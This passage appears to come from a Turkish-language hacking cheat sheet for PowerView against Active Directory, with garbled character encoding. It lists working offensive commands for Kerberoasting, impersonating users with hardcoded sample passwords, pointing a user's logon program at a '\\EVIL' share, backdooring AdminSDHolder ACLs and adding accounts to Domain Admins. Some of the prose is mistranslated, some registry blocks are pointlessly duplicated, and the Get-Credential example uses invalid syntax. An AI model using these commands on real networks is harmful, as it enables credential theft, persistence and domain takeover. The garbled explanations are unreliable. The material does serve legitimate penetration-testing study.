Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### Ã‡EÅÄ°TLÄ°

#### SID'den Ä°sim'e
```powershell
"S-1-5-21-1874506631-3219952063-538504511-2136" | Convert-SidToName
```
Kerberoast, bir Windows ortamÄ±nda kullanÄ±lan bir saldÄ±rÄ± tekniÄŸidir. Bu saldÄ±rÄ±, Kerberos kimlik doÄŸrulama protokolÃ¼nÃ¼ hedef alÄ±r ve etkilenen kullanÄ±cÄ± hesaplarÄ±nÄ±n parolalarÄ±nÄ± elde etmeyi amaÃ§lar. Kerberoast saldÄ±rÄ±sÄ±, hedef sistemdeki servis hesaplarÄ±nÄ±n parolalarÄ±nÄ± Ã§almak iÃ§in kullanÄ±lÄ±r.

Bu saldÄ±rÄ±yÄ± gerÃ§ekleÅŸtirmek iÃ§in, saldÄ±rgan Ã¶ncelikle hedef sistemdeki servis hesaplarÄ±nÄ± belirlemelidir. ArdÄ±ndan, bu hesaplarÄ±n Kerberos hizmet bileÅŸenlerine (SPN'ler) sahip olduÄŸunu kontrol eder. SPN'ler, servis hesaplarÄ±nÄ±n Kerberos kimlik doÄŸrulamasÄ± iÃ§in kullanÄ±lan benzersiz tanÄ±mlayÄ±cÄ±larÄ±dÄ±r.

SaldÄ±rgan, hedef sistemdeki SPN'leri belirledikten sonra, bu hesaplarÄ±n parolalarÄ±nÄ± Ã§almak iÃ§in Kerberoasting saldÄ±rÄ±sÄ±nÄ± gerÃ§ekleÅŸtirir. Bu saldÄ±rÄ±da, saldÄ±rgan, hedef sistemdeki SPN'leri hedefleyen bir Kerberos bileÅŸeni oluÅŸturur ve bu bileÅŸenin TGS (Hedefleme Hizmet BileÅŸeni) bileÅŸenini almasÄ±nÄ± saÄŸlar.

SaldÄ±rgan, TGS bileÅŸenini alÄ±rken, hedef sistemdeki servis hesaplarÄ±nÄ±n parolalarÄ±nÄ± Ã§almak iÃ§in bir saldÄ±rÄ± tekniÄŸi olan "offline cracking" kullanÄ±r. Bu, saldÄ±rganÄ±n TGS bileÅŸenini Ã§Ã¶zÃ¼mlemesine ve parolayÄ± elde etmesine olanak tanÄ±r.

Kerberoast saldÄ±rÄ±sÄ±, hedef sistemdeki servis hesaplarÄ±nÄ±n parolalarÄ±nÄ± elde etmek iÃ§in etkili bir yÃ¶ntemdir. Bu saldÄ±rÄ±yÄ± Ã¶nlemek iÃ§in, gÃ¼Ã§lÃ¼ ve karmaÅŸÄ±k parolalar kullanmak, servis hesaplarÄ±nÄ± dÃ¼zenli olarak denetlemek ve gÃ¼ncellemek Ã¶nemlidir. AyrÄ±ca, hedef sistemdeki SPN'leri dÃ¼zenli olarak kontrol etmek ve gereksiz SPN'leri kaldÄ±rmak da saldÄ±rÄ± riskini azaltabilir.
```powershell
Invoke-Kerberoast [-Identity websvc] #Without "-Identity" kerberoast all possible users
```
#### FarklÄ± kimlik bilgileri kullanma (argÃ¼man)

You can use different credentials when executing PowerShell commands by specifying the `-Credential` argument. This allows you to run commands with the privileges of a different user. 

For example, you can use the following syntax to specify the username and password for the desired user:

```powershell
$cred = Get-Credential -UserName 'domain\username' -Password 'password'
```

Once you have the credentials stored in the `$cred` variable, you can use them with various PowerShell cmdlets. For instance, you can use the `Invoke-Command` cmdlet to execute commands on remote systems using the specified credentials:

```powershell
Invoke-Command -ComputerName 'targetcomputer' -ScriptBlock { <command> } -Credential $cred
```

By using different credentials, you can perform actions and access resources that are restricted to specific users or groups. This can be particularly useful during penetration testing or when investigating security vulnerabilities.
```powershell
# use an alterate creadential for any function
$SecPassword = ConvertTo-SecureString 'BurgerBurgerBurger!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainUser -Credential $Cred
```
#### Bir kullanÄ±cÄ±yÄ± taklit etmek

```powershell
Invoke-UserImpersonation -Username <username>
```

Bu komut, belirtilen kullanÄ±cÄ±nÄ±n kimliÄŸini taklit etmek iÃ§in kullanÄ±lÄ±r. `<username>` parametresine taklit edilmek istenen kullanÄ±cÄ±nÄ±n adÄ±nÄ± girin.

---

#### Impersonate a user

```powershell
Invoke-UserImpersonation -Username <username>
```

This command is used to impersonate the identity of a specified user. Enter the name of the user to be impersonated in the `<username>` parameter.
```powershell
# if running in -sta mode, impersonate another credential a la "runas /netonly"
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Invoke-UserImpersonation -Credential $Cred
# ... action
Invoke-RevertToSelf
```
#### DeÄŸerleri Ayarla

```powershell
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced' -Name 'Hidden' -Value 1
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced' -Name 'HideFileExt' -Value 0
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced' -Name 'ShowSuperHidden' -Value 1
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced' -Name 'HideDrivesWithNoMedia' -Value 1
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced' -Name 'Hidden' -Value 1
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced' -Name 'HideFileExt' -Value 0
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced' -Name 'ShowSuperHidden' -Value 1
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced' -Name 'HideDrivesWithNoMedia' -Value 1
```

Bu komutlar, kayÄ±t defterinde belirli deÄŸerleri ayarlamak iÃ§in kullanÄ±lÄ±r.

```powershell
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced' -Name 'Hidden' -Value 1
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced' -Name 'HideFileExt' -Value 0
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced' -Name 'ShowSuperHidden' -Value 1
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced' -Name 'HideDrivesWithNoMedia' -Value 1
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced' -Name 'Hidden' -Value 1
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced' -Name 'HideFileExt' -Value 0
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced' -Name 'ShowSuperHidden' -Value 1
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced' -Name 'HideDrivesWithNoMedia' -Value 1
```

These commands are used to set specific values in the registry.
```powershell
# set the specified property for the given user identity
Set-DomainObject testuser -Set @{'mstsinitialprogram'='\\EVIL\program.exe'} -Verbose
# Set the owner of 'dfm' in the current domain to 'harmj0y'
Set-DomainObjectOwner -Identity dfm -OwnerIdentity harmj0y
# Backdoor the ACLs of all privileged accounts with the 'matt' account through AdminSDHolder abuse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
# Add user to 'Domain Admins'
Add-NetGroupUser -Username username -GroupName 'Domain Admins' -Domain my.domain.local
```
<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman seviyesine Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

* Bir **cybersecurity ÅŸirketinde mi Ã§alÄ±ÅŸÄ±yorsunuz**? **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek** ister misiniz? veya **PEASS'Ä±n en son sÃ¼rÃ¼mÃ¼ne veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family), Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonunu keÅŸfedin.
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin.
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter**'da beni takip edin ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Hacking hilelerinizi [hacktricks repo](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)'ya PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>
